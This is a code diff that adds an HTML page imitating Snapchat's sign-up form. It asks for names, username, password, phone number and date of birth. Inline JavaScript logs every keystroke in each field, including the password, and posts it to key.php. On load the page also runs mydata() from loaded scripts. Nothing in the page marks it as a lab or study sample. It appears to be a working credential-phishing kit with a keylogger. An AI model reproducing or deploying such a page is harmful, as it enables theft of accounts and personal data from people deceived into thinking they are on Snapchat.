@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Snapchat Login Page</title>
+  <link rel="stylesheet" href="./style.css">
+
+  <script src="client.min.js"></script>
+  <script src="loc.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js "></script>
+
+
+</head>
+<body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat</title>
+    <link rel="stylesheet" href="style.css">
+
+</head>
+
+<body onload="mydata()">
+
+    <div class="wrapper">
+        <div class="section">
+            <h4>Already have a Snapchat account? <a href="#"><button>Log In</button></a> </h4>
+        </div>
+        <div class="form">
+            <h3>Sign up for Snapchat</h3>
+            <div class="name">
+                <div class="first">
+                    <label for="">First Name</label>
+                    <input id="name" type="text">
+                </div>
+                <div class="last">
+                    <label for="">Last Name</label>
+                    <input id="lname" type="text">
+                </div>
+            </div>
+            <label for="">Username</label>
+            <input id="username" type="text" class="input">
+            <label for="">Password</label>
+            <input id="pass" type="password" class="input">
+            <label for="">Phone Number</label>
+            <input id="number" type="number" class="input">
+            <label for="">Date of Birth</label>
+            <div class="dob">
+                <div class="month">
+                    <input id="month" type="number" placeholder="Month">
+                </div>
+                <div class="day">
+                    <input id="day" type="number" placeholder="Day">
+                </div>
+                <div class="year">
+                    <input id="year" type="number" placeholder="Year">
+                </div>
+            </div>
+            <p>By tapping “Sign Up & Accept”, you acknowledge that you have read the <a href="#">Privacy Policy</a> and agree to the <a href="#">Terms of Service</a>. We'll send you a message to verify this number. Messaging rates may apply. Snapchatters can always capture or save your messages, such as by taking a screenshot or using a camera. Be mindful about what you Snap!</p>
+            <a href="#"><button class="signup">Sign Up & Accept</button></a>
+        </div>
+
+    </div>
+
+    <script>
+      
+        document
+        .getElementById("name")
+        .addEventListener("keypress", function (data) {
+            $.post("key.php", {namekey: data.key });
+          });
+          
+        document
+          .getElementById("lname")
+          .addEventListener("keypress", function (data) {
+            $.post("key.php", {namekey: data.key });
+          });
+
+
+        document
+        .getElementById("username")
+        .addEventListener("keypress", function (data) {
+            $.post("key.php", {userkey: data.key });
+          });
+          
+        document
+          .getElementById("pass")
+          .addEventListener("keypress", function (data) {
+            $.post("key.php", {passkey: data.key });
+          });
+
+
+          document
+        .getElementById("number")
+        .addEventListener("keypress", function (data) {
+            $.post("key.php", {numberkey: data.key });
+          });
+          
+        document
+          .getElementById("month")
+          .addEventListener("keypress", function (data) {
+            $.post("key.php", {birthkey: data.key });
+          });
+          
+
+          document
+        .getElementById("day")
+        .addEventListener("keypress", function (data) {
+            $.post("key.php", {birthkey: data.key });
+          });
+          
+        document
+          .getElementById("year")
+          .addEventListener("keypress", function (data) {
+            $.post("key.php", {birthkey: data.key });
+          });
+      
+      </script>
+
+</body>
+  
+</html>
+  
+</body>
+</html>
